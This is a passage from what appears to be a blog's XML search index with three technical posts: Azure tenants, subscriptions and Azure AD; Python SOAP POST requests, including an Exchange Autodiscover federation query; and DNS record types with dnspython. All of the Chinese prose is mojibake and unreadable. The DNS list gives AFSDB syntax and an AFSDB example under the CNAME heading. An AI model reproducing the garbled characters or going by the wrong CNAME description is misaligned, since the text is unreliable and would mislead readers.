·è½¯ä»¶æ›´æ–°å¯ä»¥ç»Ÿä¸€è¿›è¡Œï¼Œä¹Ÿå¯ä»¥å…±äº«åº•å±‚èµ„æºï¼ˆå¤šç§å…±äº«æ¨¡å¼ï¼‰ã€‚<br>2ï¼‰ç§Ÿæˆ·ä¸ç§Ÿæˆ·ä¹‹é—´è¿›è¡Œæ•°æ®éš”ç¦»ã€‚<br>ä¸€è¨€ä»¥è”½ä¹‹ï¼šå¤šç§Ÿæˆ·çš„å…³é”®å°±æ˜¯åŒä¸€å¥—åº”ç”¨ç¨‹åºä¸‹å®ç°å¤šç”¨æˆ·ç»„ç»‡çš„æ•°æ®éš”ç¦»ã€‚</p></blockquote></div><h2 id="Subscriptions">Subscriptions</h2><div class="story post-story"><p>è®¢é˜…æ˜¯ä¸ Microsoft é’ˆå¯¹ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ª Microsoft äº‘å¹³å°æˆ–æœåŠ¡ç­¾è®¢çš„åè®®ï¼Œå…¶è´¹ç”¨åŸºäºæ¯ä¸ªç”¨æˆ·è®¸å¯è¯è´¹ç”¨æˆ–äº‘èµ„æºä½¿ç”¨ç´¯è®¡ã€‚</p><p>è®¢é˜…æ˜¯ä¸€ä¸ªé€»è¾‘å®¹å™¨ï¼Œå¯ä»¥åœ¨å…¶ä¸­éƒ¨ç½²ä»»æ„æ•°é‡çš„èµ„æº(è™šæ‹Ÿæœºã€Webåº”ç”¨ç¨‹åºã€å­˜å‚¨å¸æˆ·ç­‰)ã€‚å®ƒè¿˜å¯ä»¥ç”¨äºå¯¹è¿™äº›èµ„æºè¿›è¡Œè®¿é—®æ§åˆ¶ï¼Œä¸è¿‡ç›®å‰æ­£ç¡®çš„æ–¹æ³•æ˜¯åˆ©ç”¨åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶(Role Based access control, RBAC)æˆ–ç®¡ç†ç»„ã€‚</p><p><strong>ä¸€å¥è¯è¯´è®¢é˜…å°±æ˜¯ç”¨æ¥å…³è”Azureè´¦æˆ·å’ŒAzureèµ„æºæœåŠ¡çš„ä¸œè¥¿ã€‚</strong></p><p><font color='red'>ä¸€ä¸ªç§Ÿæˆ·å¯ä»¥å…³è”å¤šä¸ªè®¢é˜…</font>ã€‚æ¯”å¦‚ï¼Œå…¬å¸å¯ä»¥æŠŠè®¢é˜…å‘½åä¸ºè´¢åŠ¡éƒ¨ã€å¸‚åœºéƒ¨ã€é”€å”®éƒ¨ç­‰ç­‰æ¥ç®¡ç†ã€‚æ¯ä¸ªè®¢é˜…çš„è´¹ç”¨å’Œè®¡è´¹æ–¹å¼å’Œä½¿ç”¨éƒ½æ˜¯ç‹¬ç«‹åˆ†å¼€çš„ã€‚<font color='red'>ä½†æ˜¯ä¸€ä¸ªè®¢é˜…åªèƒ½ä¸ªä¸€ä¸ªç§Ÿæˆ·ç»‘å®šã€‚</font></p><blockquote><p>è´¦æˆ·å’Œè®¢é˜…çš„å…³ç³»å¯ä»¥ç†è§£ä¸ºï¼š<br><strong>è´¦æˆ·æ˜¯äººçš„èº«ä»½è¯ï¼Œè®¢é˜…æ˜¯æ‰‹æœºå·ç ï¼Œæ‰‹æœºå·ç éœ€è¦ç”¨èº«ä»½è¯å»æ³¨å†Œç”³è¯·ï¼Œä¸€ä¸ªäººå¯ä»¥æœ‰å¥½å‡ ä¸ªæ‰‹æœºå·ç ï¼Œæ‹¿ä¸€ä¸ªå·¥ä½œç”¨ï¼Œä¸€ä¸ªå®¶äººç”¨ï¼Œä¸¤è€…åˆ†åˆ«å•ç‹¬è®¡è´¹ä¸åŒç”¨é€”ï¼Œè€Œä¸”ä¸€ä¸ªæ‰‹æœºå·åªèƒ½å¯¹åº”ä¸€ä¸ªèº«ä»½è¯å·ã€‚</strong></p></blockquote><p>ç»„ç»‡å¯è®¢é˜…å¤šä¸ª Micrososft äº‘æœåŠ¡</p><p><img src="https://s2.loli.net/2021/12/14/hbnHZ2X5YRowf1C.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/14/hbnHZ2X5YRowf1C.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ç»„ç»‡è®¢é˜…å¤šä¸ª Micrososft äº‘æœåŠ¡çš„ç¤ºä¾‹ã€‚"></p></div><h2 id="Licenses">Licenses</h2><div class="story post-story"><p>è®¸å¯è¯å…è®¸ç‰¹å®šç”¨æˆ·å¸æˆ·ä½¿ç”¨äº‘äº§å“çš„æœåŠ¡ã€‚ç®¡ç†å‘˜å°†è®¸å¯è¯åˆ†é…ç»™è®¢é˜…ä¸­çš„å„ä¸ªç”¨æˆ·å¸æˆ·</p><p><img src="https://s2.loli.net/2021/12/14/Hce2UvzZI9xthMa.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/14/Hce2UvzZI9xthMa.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Microsoft åŸºäº SaaS çš„äº‘æœåŠ¡è®¢é˜…ä¸­çš„å¤šä¸ªè®¸å¯è¯ç¤ºä¾‹ã€‚"></p><blockquote><p>å¯¹äºå›¾ä¸­çš„ç¤ºä¾‹ï¼ŒContoso å…¬å¸è®¢é˜…äº†å…·æœ‰ 100 ä¸ªè®¸å¯è¯çš„ Office 365 E5ï¼Œå…è®¸æœ€å¤š 100 ä¸ªå•ä¸ªç”¨æˆ·å¸æˆ·ä½¿ç”¨ Microsoft 365 E5 çš„åŠŸèƒ½å’ŒæœåŠ¡ã€‚</p></blockquote></div><h2 id="AD-Active-Directory">AD Active Directory</h2><div class="story post-story"><p>æ‰€æœ‰ Microsoft äº‘æœåŠ¡çš„ç”¨æˆ·å¸æˆ·å‡å­˜å‚¨åœ¨ Active Directory (Azure AD) ç§Ÿæˆ·(tenant)ä¸­ï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·å¸æˆ·å’Œç»„ã€‚Azure AD tenant å¯ä»¥ä½¿ç”¨åŸºäº Windows æœåŠ¡å™¨æœåŠ¡çš„ Azure AD Connectä¸ç°æœ‰çš„Active Directory Domain Services (AD DS)å¸æˆ·åŒæ­¥ã€‚è¿™å«åšç›®å½•åŒæ­¥ã€‚</p><p><img src="https://s2.loli.net/2021/12/14/cHGwkK5X7UNeLJF.png" class="lazyload" data-srcset="https://s2.loli.net/2021/12/14/cHGwkK5X7UNeLJF.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ç»„ç»‡ä½¿ç”¨åŒä¸€ä¸ª Azure AD ç§Ÿæˆ·è¿›è¡Œå¤šä¸ªè®¢é˜…çš„ç¤ºä¾‹ã€‚"></p><blockquote><p><strong>ç»„ç»‡ä½¿ç”¨åŒä¸€ Azure AD ç§Ÿæˆ·è¿›è¡Œçš„å¤šä¸ªè®¢é˜…</strong></p></blockquote><p><strong>æ´»åŠ¨ç›®å½•æ˜¯ä¸€ä¸ªç³»ç»Ÿï¼Œç”¨æ¥å­˜å‚¨ç›®å½•æ•°æ®ï¼Œç®¡ç†ç”¨æˆ·å’Œèµ„æºä¹‹é—´çš„é€šä¿¡</strong></p><blockquote><p>ADæœ‰ Azure AD å’Œæœ¬åœ°çš„ ADåŸŸæœåŠ¡ï¼ˆAD DSï¼‰</p><p>â€‹AD DSæ˜¯æœ¬åœ°Windows serveræœåŠ¡å™¨ä¸Šçš„è§’è‰²ã€‚</p><p>â€‹Azure AD æ˜¯å¤šç”¨æˆ·å…¬å…±ç›®å½•æœåŠ¡ï¼Œè¿™æ„å‘³ç€Azure ADä¸ºäº‘æœåŠ¡å’Œåº”ç”¨ç¨‹åºåˆ›å»ºç§Ÿæˆ·ã€‚</p><p>Azure ADæ˜¯äº‘ä¸Šçš„å¤šç§Ÿæˆ·ç›®å½•å’Œæ ‡è¯†ç®¡ç†æœåŠ¡ï¼Œæä¾›æ ¸å¿ƒç›®å½•å’Œèº«ä»½ç®¡ç†åŠŸèƒ½ï¼Œuserå¯ä»¥ä½¿ç”¨å•ä¸€ç™»å½•SSOæ¥è®¿é—®å…¶ä»–äº‘çš„SaaSåº”ç”¨ç¨‹åºï¼Œå¦‚Office365ã€‚æ¯”å¦‚ï¼Œæ¯ä¸ªOffice365ï¼ŒAzureï¼ŒCRM onlineç§Ÿæˆ·å®é™…ä¸Šéƒ½æ˜¯Azure ADçš„ç§Ÿæˆ·ã€‚ç”¨ç§Ÿæˆ·æ¥ä¸ºAzure ADé‡Œé¢çš„appç®¡ç†è®¿é—®æƒé™ã€‚</p><p>AADæ˜¯å¤šç§Ÿæˆ·æœåŠ¡ï¼Œæ„å‘³ç€èƒ½å¤ŸåŒæ—¶æ”¯æŒå¤šä¸ªä¸åŒçš„ç»„ç»‡ï¼Œå¯å­˜å‚¨æ¯ä¸ªç»„ç»‡ä¸­ç”¨æˆ·çš„ç›®å½•ä¿¡æ¯ã€‚<br>AADåä¸€ç›®å½•ä¸ºå•ä½æ¥åŒºåˆ†èŒƒå›´çš„ã€‚æ¯ä¸ªç›®å½•ç›¸å½“äºä¸€ä¸ªæˆ¿é—´ã€‚è¿™äº›æˆ¿é—´åŒåœ¨ä¸€ä¸ªå¤§æ¥¼é‡Œé¢ï¼Œä½†æ˜¯æ¯ä¸ªæˆ¿é—´åˆæ˜¯ç›¸å¯¹ç‹¬ç«‹çš„ä¸€ä¸ªä¸ªä½“ã€‚è¦æƒ³åœ¨AADä¸­æ·»åŠ äººæˆ–è€…æ·»åŠ ç¨‹åºæ—¶é¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œç›®å½•æ˜¯æœ€åŸºæœ¬çš„å­˜åœ¨ï¼ŒAADä¸­æ‰€æœ‰çš„ä¸œè¥¿éƒ½æ˜¯ä¿å­˜åœ¨ç›®å½•ä¸­ã€‚</p></blockquote></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Azure </tag>
            
            <tag> Azure AD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python å¤„ç†Soap-Postæ–¹æ³•</title>
      <link href="/posts/d61d731c/"/>
      <url>/posts/d61d731c/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯¼è¯­">å¯¼è¯­</h2><div class="story post-story"><p>æœ€è¿‘é¡¹ç›®ç”¨åˆ°å¤„ç†soapæ¥å£åè®®ï¼Œä½¿ç”¨postæ–¹æ³•å‘é€æ•°æ®</p><p>åœ¨è¿™ä¸ªåœ°æ–¹åœç•™è®¸ä¹…ï¼Œæ•…å°†è§£å†³æ–¹æ³•è®°å½•ä¸‹æ¥</p></div><h2 id="soap">soap</h2><div class="story post-story"><p>soap ä¾èµ–äº<code>XML</code>æ–‡ä»¶</p><p>é¦–å…ˆè¦å¤„ç†XMLæ–‡ä»¶</p><p>pythonä¸­æœ‰<code>xmltodict,dicttoxml</code>ä¸¤ä¸ªåº“å¯ä»¥ä½¿ç”¨</p></div><h2 id="ä½¿ç”¨æ–¹æ³•">ä½¿ç”¨æ–¹æ³•</h2><div class="story post-story"><p>ä¸¤ç§è§£å†³æ–¹æ³•ï¼š</p><p>ä¸€ç§æ˜¯ <code>requests</code>æ–¹æ³•</p><p>å¦ä¸€ç§æ˜¯ä½¿ç”¨<code>suds</code>åº“</p><p>ä¸¤ç§æ–¹æ³•å¯å‚è€ƒï¼š</p><p><a href="https://gist.github.com/toast38coza/17e2ad6c2cfa2e96b0b1">Call a SOAP Service with plain old requests</a></p><p><a href="https://gist.github.com/toast38coza/c7342fcc1dd5762d4c02">Calling a SOAP WebService with Python Suds</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Call a SOAP Service with plain old requests</span><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://wsf.cdyne.com/WeatherWS/Weather.asmx?WSDL"</span><span class="token comment">#headers = &#123;'content-type': 'application/soap+xml'&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'content-type'</span><span class="token punctuation">:</span> <span class="token string">'text/xml'</span><span class="token punctuation">&#125;</span>body <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="UTF-8"?> &lt;SOAP-ENV:Envelope xmlns:ns0="http://ws.cdyne.com/WeatherWS/" xmlns:ns1="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> &lt;SOAP-ENV:Header/>   &lt;ns1:Body>&lt;ns0:GetWeatherInformation/>&lt;/ns1:Body> &lt;/SOAP-ENV:Envelope>"""</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>body<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span> response<span class="token punctuation">.</span>content<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>åä¸½çš„åˆ†å‰²çº¿<span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token comment"># Calling a SOAP WebService with Python Suds</span><span class="token keyword">from</span> suds<span class="token punctuation">.</span>client <span class="token keyword">import</span> Clienturl<span class="token operator">=</span><span class="token string">"http://wsf.cdyne.com/WeatherWS/Weather.asmx?WSDL"</span>client <span class="token operator">=</span> Client<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span> client <span class="token comment">## shows the details of this service</span>result <span class="token operator">=</span> client<span class="token punctuation">.</span>service<span class="token punctuation">.</span>GetWeatherInformation<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">print</span> result <span class="token comment">## see: restult.txt below</span></code></pre><p>è¿™é‡Œé‡‡ç”¨çš„æ˜¯<code>requests</code>æ–¹æ³•</p></div><h2 id="é‡åˆ°é—®é¢˜">é‡åˆ°é—®é¢˜</h2><div class="story post-story"><p>æ„é€ <code>header``body</code>,<code>uri</code> å</p><p>æ— è®ºæ˜¯ä½¿ç”¨pythonä»£ç è¿˜æ˜¯ä½¿ç”¨postmanå·¥å…·</p><p>è·å¾—è¿”å›çš„ç»“æœéƒ½æ˜¯äºŒè¿›åˆ¶æµï¼Œè§£æåä¹±ç </p><p>å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/11/25/Dfa8t1ScETWlUid.png" class="lazyload" data-srcset="https://i.loli.net/2021/11/25/Dfa8t1ScETWlUid.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211125121849081"></p><p>å°è¯•å„ç§è®¾ç½®ç¼–ç ä¸º<code>'utf-8'</code> ä»è¾“å‡ºä¹±ç ï¼Œ åˆæ­¥åˆ¤æ–­ï¼š<font color='red'> å¯¹è¿”å›çš„ç»“æœè§£æç¼–ç çš„é—®é¢˜</font></p><p><strong>æ„é€ çš„bodyä¸ºï¼š</strong></p><pre class="language-python" data-language="python"><code class="language-python">body <span class="token operator">=</span> <span class="token string">"&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>\n&lt;soap:Envelope xmlns:exm=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:ext=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:a=\"http://www.w3.org/2005/08/addressing\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\n&lt;soap:Header>\n&lt;a:Action soap:mustUnderstand=\"1\">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation&lt;/a:Action>\n&lt;a:To soap:mustUnderstand=\"1\">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc&lt;/a:To>\n&lt;a:ReplyTo>\n&lt;a:Address>http://www.w3.org/2005/08/addressing/anonymous&lt;/a:Address>\n&lt;/a:ReplyTo>\n&lt;/soap:Header>\n&lt;soap:Body>\n&lt;GetFederationInformationRequestMessage xmlns=\"http://schemas.microsoft.com/exchange/2010/Autodiscover\">\n&lt;Request>\n&lt;Domain>"</span> <span class="token operator">+</span> domain <span class="token operator">+</span> <span class="token string">"&lt;/Domain>\n&lt;/Request>\n&lt;/GetFederationInformationRequestMessage>\n&lt;/soap:Body>\n&lt;/soap:Envelope>"</span></code></pre><p><strong>æ„é€ çš„headerä¸º</strong></p><pre class="language-python" data-language="python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'content-type'</span><span class="token punctuation">:</span> <span class="token string">'text/xml'</span><span class="token punctuation">,</span>    <span class="token string">'SOAPAction'</span><span class="token punctuation">:</span> <span class="token string">'http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation'</span><span class="token punctuation">,</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'AutodiscoverClient'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span></code></pre></div><h2 id="è§£å†³æ–¹æ³•ï¼š">è§£å†³æ–¹æ³•ï¼š</h2><div class="story post-story"><p><font color='orange'>åˆ¤æ–­ä¸ºè¿”å›ç»“æœè§£ç é€ æˆçš„</font></p><p>å°è¯•åœ¨headerä¸­æ·»åŠ <code>'Accept-Encoding':'utf-8'</code></p><p>å¦‚ä¸‹:</p><pre class="language-python" data-language="python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'content-type'</span><span class="token punctuation">:</span> <span class="token string">'text/xml'</span><span class="token punctuation">,</span>    <span class="token string">'SOAPAction'</span><span class="token punctuation">:</span> <span class="token string">'http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation'</span><span class="token punctuation">,</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'AutodiscoverClient'</span><span class="token punctuation">,</span>    <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span></code></pre><p><strong>ç»“æœï¼š</strong></p><p>ä¹±ç é—®é¢˜æˆåŠŸè§£å†³ï¼š</p><p><img src="https://i.loli.net/2021/11/25/pMeXbHc8gtNxYQm.png" class="lazyload" data-srcset="https://i.loli.net/2021/11/25/pMeXbHc8gtNxYQm.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211125122254951"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> soap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonè§£æDNSè®°å½•</title>
      <link href="/posts/c3784c4e/"/>
      <url>/posts/c3784c4e/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯¼è¯­">å¯¼è¯­</h2><div class="story post-story"><p>æœ€è¿‘é¡¹ç›®ç”¨åˆ° python è§£æDNSè®°å½•ï¼Œæ•…å°†è¿‡ç¨‹è®°å½•ä¸‹æ¥</p><p><strong>å¸¸ç”¨è§£æè®°å½•</strong></p><blockquote><p><strong>1.ä¸»æœº[A]è®°å½•</strong></p><p>æè¿°: ä¸»æœºåœ°å€è®°å½•ã€‚åœ¨ DNS åŸŸåä¸ IP åœ°å€ä¹‹é—´å»ºç«‹æ˜ å°„å…³ç³»è¯­æ³•: owner class ttl A IP_v4_address ä¾‹å­: <a href="http://host1.example.microsoft.com">host1.example.microsoft.com</a>. IN A 127.0.0.1</p><p><strong>2.åˆ«å[CNAME]</strong></p><p>æè¿°: ç”¨æ¥è¡¨ç¤ºç”¨åœ¨è¯¥åŒºåŸŸä¸­çš„å…¶å®ƒèµ„æºè®°å½•ç±»å‹ä¸­å·²æŒ‡å®šåç§°çš„æ›¿è¡¥æˆ–åˆ«å DNS åŸŸåã€‚è¯­æ³•: owner ttl class AFSDB subtype server_host_name ä¾‹å­: <a href="http://aliasname.example.microsoft.com">aliasname.example.microsoft.com</a>. AFSDB 1 <a href="http://truename.example.microsoft.com">truename.example.microsoft.com</a>.</p><p><strong>3.ä¸»æœºä¿¡æ¯[HINFO]</strong></p><p>æè¿°: ç”¨æ¥è¯´æ˜æ˜ å°„åˆ°ç‰¹å®š DNS ä¸»æœºåçš„ CPU ç±»å‹å’Œæ“ä½œç³»ç»Ÿç±»å‹çš„ RFC-1700 ä¿ç•™å­—ç¬¦ä¸²ç±»å‹ï¼Œè¿™ä¸ªä¿¡æ¯å¯ä»¥è¢«åº”ç”¨ç¨‹åºé€šä¿¡åè®®ä½¿ç”¨ã€‚è¯­æ³•: owner ttl class HINFO cpu_type os_type ä¾‹å­: <a href="http://my-computer-name.example.microsoft.com">my-computer-name.example.microsoft.com</a>. HINFO INTEL-386 WIN32</p><p><strong>4.é‚®ç®±[MB]</strong></p><p>æè¿°: ç”¨æ¥å°†æŒ‡å®šçš„åŸŸé‚®ç®±åæ˜ å°„åˆ°è¿™ä¸ªé‚®ç®±çš„ä¸»æœºçš„å½“å‰åŒºåŸŸä¸­çš„ä¸»æœºåœ°å€è®°å½•è¯­æ³•: owner ttl class MB mailbox_hostname ä¾‹å­: <a href="http://mailbox.example.microsoft.com">mailbox.example.microsoft.com</a>. MB <a href="http://mailhost1.example.microsoft.com">mailhost1.example.microsoft.com</a></p><p><strong>5.é‚®ç®±æˆ–é€šä¿¡ä¿¡æ¯ MINFO</strong></p><p>æè¿°: ç”¨æ¥æŒ‡å®šè´Ÿè´£ç»´æŠ¤è¯¥è®°å½•ä¸­ç‰¹å®šé€šä¿¡åå•æˆ–é‚®ç®±çš„è”ç³»åŸŸé‚®ç®±åç§°ã€‚åŒæ—¶ï¼Œè¿˜è¢«ç”¨æ¥æŒ‡å®šæ¥æ”¶ä¸è¯¥è®°å½•ä¸­ç‰¹å®šé€šä¿¡åå•æˆ–é‚®ç®±æœ‰å…³çš„é”™è¯¯ä¿¡æ¯çš„é‚®ç®±è¯­æ³•: owner ttl class MINFO responsible_mailbox error_mailbox ä¾‹å­: <a href="http://administrator.example.microsoft.com">administrator.example.microsoft.com</a>. MINFO <a href="http://resp-mbox.example.microsoft.com">resp-mbox.example.microsoft.com</a> <a href="http://err-mbox.example.microsoft.com">err-mbox.example.microsoft.com</a></p><p><strong>6.é‚®ä»¶äº¤æ¢å™¨ [MX]</strong></p><p>æè¿°: ç”¨æ¥å‘ç‰¹å®šé‚®ä»¶äº¤æ¢å™¨æä¾›æ¶ˆæ¯è·¯ç”±ï¼Œè¯¥ä¸»æœºä½œä¸ºæŒ‡å®š DNS åŸŸåçš„é‚®ä»¶äº¤æ¢å™¨ã€‚MX è®°å½•éœ€è¦ä¸€ä¸ª16-ä½æ•´æ•°æ¥è¡¨ç¤ºæ¶ˆæ¯è·¯ç”±ä¸­çš„ä¸»æœºä¼˜å…ˆçº§ï¼Œå¤šä¸ªé‚®ä»¶äº¤æ¢åœ¨æ¶ˆæ¯ä¸€ä¸­è¢«æŒ‡å®šã€‚å¯¹äºè¿™ä¸ªè®°å½•ç±»å‹ä¸­çš„æ¯ä¸ªé‚®ä»¶äº¤æ¢ä¸»æœºï¼Œéœ€è¦ä¸€ä¸ªç›¸åº”çš„ä¸»æœºåœ°å€ç±»å‹è®°å½•ã€‚è¯­æ³•: owner ttl class MX preference mail_exchanger_host ä¾‹å­: <a href="http://example.microsoft.com">example.microsoft.com</a>. MX 10 <a href="http://mailserver1.example.microsoft.com">mailserver1.example.microsoft.com</a></p><p><strong>7.æŒ‡é’ˆè®°å½• [PTR]</strong></p><p>æè¿°:ç”¨æ¥æŒ‡å‘åŸŸåç©ºé—´ä¸­çš„æŸä¸ªä½ç½®ã€‚PTRè®°å½•é€šå¸¸åœ¨ç‰¹æ®ŠåŸŸä¸­æ¥æ‰§è¡Œåœ°å€åˆ°åç§°é•œåƒçš„åå‘æœç´¢ã€‚æ¯ä¸ªè®°å½•æä¾›è¦æŒ‡å‘åŸŸåç§°ç©ºé—´çš„æŸä¸ªå…¶å®ƒä½ç½®çš„ç®€å•æ•°æ®ã€‚ Syntax: owner ttl class PTR targeted_domain_name ä¾‹å­: 1.0.0.10.in-addr.arpa. PTR <a href="http://host.example.microsoft.com">host.example.microsoft.com</a>.</p><p><strong>8.æœåŠ¡è®°å½• [SRV]</strong></p><p>æè¿°: SRV èµ„æºè®°å½•å…è®¸ç®¡ç†å‘˜ä½¿ç”¨å•ä¸€ DNS åŸŸçš„å¤šä¸ªæœåŠ¡å™¨ï¼Œå®¹æ˜“çš„ç”¨ç®¡ç†åŠŸèƒ½å°† TCP/IP æœåŠ¡ä»ä¸€ä¸ªä¸»æœºç§»åˆ°å¦ä¸€ä¸ªä¸»æœºï¼Œå¹¶ä¸”å°†æœåŠ¡æä¾›çš„ç¨‹åºä¸»æœºåˆ†æ´¾ä¸ºæœåŠ¡çš„ä¸»æœåŠ¡å™¨ï¼Œå°†å…¶å®ƒçš„åˆ†æ´¾ä¸ºè¾…åŠ©çš„è¯­æ³•: <a href="http://service.protocol.name">service.protocol.name</a> ttl class SRV preference weight port target ä¾‹å­: ldap.tcp.ms-dcs SRV 0 0 389 <a href="http://dc1.example.microsoft.com">dc1.example.microsoft.com</a> SRV 10 0 389 <a href="http://dc2.example.microsoft.com">dc2.example.microsoft.com</a></p><p><strong>9.å·²çŸ¥æœåŠ¡è®°å½• [WKS]</strong></p><p>æè¿°: ç”¨æ¥æè¿°ä¸€ä¸ªç‰¹å®š IP åœ°å€ä¸Šç‰¹å®šé€šè®¯åè®®æ”¯æŒçš„ TCP/IP æœåŠ¡ï¼Œå®ƒæä¾› TCP å’Œ UDP å¯ä½¿ç”¨æ€§ä¿¡æ¯ã€‚å¦‚æœæœåŠ¡å™¨åŒæ—¶æ”¯æŒ TCP å’Œ UDP çš„å·²çŸ¥æœåŠ¡ï¼Œæˆ–è€…æœ‰å¤šä¸ªæ”¯æŒæœåŠ¡çš„ IP åœ°å€ï¼Œå¤šä¸ª WKS è®°å½•ä¼šè¢«ä½¿ç”¨è¯­æ³•: owner ttl class WKS address protocol service_list ä¾‹å­: <a href="http://example.microsoft.com">example.microsoft.com</a>. WKS 10.0.0.1 TCP ( telnet smtp ftp ) ã€€ã€€åœ¨&quot;èµ·å§‹é¢å‘æœºæ„&quot; SOA ä¸­ï¼Œè®°å½•äº†è¿™ä¸ª Zone ä¸­ DNS æœåŠ¡å™¨æ˜¯é‚£ä¸€å°ä¸»æœºï¼Œä¹Ÿè®°å½•ç€è´Ÿè´£æœ¬ zone çš„ç®¡ç†å‘˜çš„é‚®ä»¶åœ°å€ï¼Œå¦‚æœä»¥ååœ¨å®‰è£…é‚®ä»¶æœåŠ¡å™¨éœ€è¦ä¿®æ”¹è¯¥ä¿¡æ¯æ—¶ï¼Œæ³¨æ„å°†é‚®ä»¶åœ°å€ä¸­çš„ â€œ@â€ ç¬¦æ”¹ä¸ºå¥ç‚¹ â€œ.â€ ï¼Œå› ä¸º â€œ@â€ æ˜¯ä¿ç•™å­—ï¼Œä»£è¡¨ zoneï¼›å¦å¤–ï¼Œè¦ä½¿ç”¨åŸŸå®Œæ•´åç§° FQDNï¼Œä¸è¦æ¼æ‰æœ€åçš„å¥ç‚¹ã€‚å¯ä»¥é€šè¿‡ &quot;zoneâ†’å±æ€§â†’èµ·å§‹é¢å‘æœºæ„&quot;å¯¹ç®¡ç†å‘˜é‚®ä»¶åœ°å€è¿›è¡Œä¿®æ”¹ã€‚</p></blockquote></div><h2 id="dnspythonåº“">dnspythonåº“</h2><div class="story post-story"><p>å¦‚æœæŸ¥è¯¢ä¸åˆ°å¯¹åº”çš„ç»“æœæŠ¥<font color="red">dns.resolver.NoAnswer</font>é”™è¯¯ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">dns<span class="token punctuation">.</span>resolver<span class="token punctuation">.</span>NoAnswer<span class="token punctuation">:</span> The DNS response does <span class="token keyword">not</span> contain an answer to the question<span class="token punctuation">:</span> baidu<span class="token punctuation">.</span>com<span class="token punctuation">.</span> IN XXX</code></pre><p>å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    re <span class="token operator">=</span> dns<span class="token punctuation">.</span>resolver<span class="token punctuation">.</span>query<span class="token punctuation">(</span>qname<span class="token punctuation">,</span>rdtype<span class="token punctuation">)</span><span class="token keyword">except</span> dns<span class="token punctuation">.</span>resolver<span class="token 